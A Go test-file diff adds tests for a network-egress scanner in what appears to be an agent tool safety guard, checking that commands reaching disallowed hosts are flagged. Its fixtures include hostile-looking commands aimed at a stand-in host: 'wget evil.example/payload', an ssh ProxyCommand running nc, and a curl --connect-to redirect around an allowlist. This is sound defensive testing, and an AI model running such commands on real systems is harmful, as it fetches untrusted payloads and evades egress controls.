@@ -43,6 +43,69 @@ func TestAuditSinkEdgeCases(t *testing.T) {
 	require.NoError(t, sink.lastErr())
 }
 
+func TestScanNetworkCommandSegmentDispatch(t *testing.T) {
+	policy := DefaultPolicy()
+	policy.AllowedDomains = []string{"good.example", "github.com"}
+
+	tests := []struct {
+		name string
+		argv []string
+		rule string
+	}{
+		{name: "empty", argv: nil},
+		{name: "unrelated command", argv: []string{"echo", "ok"}},
+		{
+			name: "git",
+			argv: []string{"git", "clone", "https://evil.example/repo"},
+			rule: ruleNetworkEgress,
+		},
+		{
+			name: "curl",
+			argv: []string{"curl", "-K", "/tmp/curlrc", "https://good.example/repo"},
+			rule: ruleNetworkEgress,
+		},
+		{
+			name: "wget",
+			argv: []string{"wget", "evil.example/payload"},
+			rule: ruleNetworkEgress,
+		},
+		{
+			name: "ssh",
+			argv: []string{"ssh", "-o", "ProxyCommand=nc evil.example 22", "good.example"},
+			rule: ruleNetworkEgress,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			findings := scanNetworkCommandSegment(context.Background(), tt.argv, policy)
+			report := Report{Findings: findings}
+			if tt.rule == "" {
+				require.Empty(t, findings)
+				return
+			}
+			require.True(t, hasRule(report, tt.rule), findings)
+		})
+	}
+}
+
+func TestScanNetworkCommandSegmentHonorsCancelledContext(t *testing.T) {
+	policy := DefaultPolicy()
+	policy.AllowedDomains = []string{"good.example"}
+
+	tests := [][]string{
+		{"git", "clone", "https://evil.example/repo"},
+		{"curl", "--connect-to", "good.example:443:evil.example:443", "https://good.example/repo"},
+		{"ssh", "evil.example"},
+	}
+	for _, argv := range tests {
+		ctx, cancel := context.WithCancel(context.Background())
+		cancel()
+		report := Report{Findings: scanNetworkCommandSegment(ctx, argv, policy)}
+		require.True(t, hasRule(report, ruleContextCancelled), argv)
+	}
+}
+
 func TestBlockedErrorMessages(t *testing.T) {
 	var nilErr *BlockedError
 	require.Equal(t, "tool safety guard blocked execution", nilErr.Error())
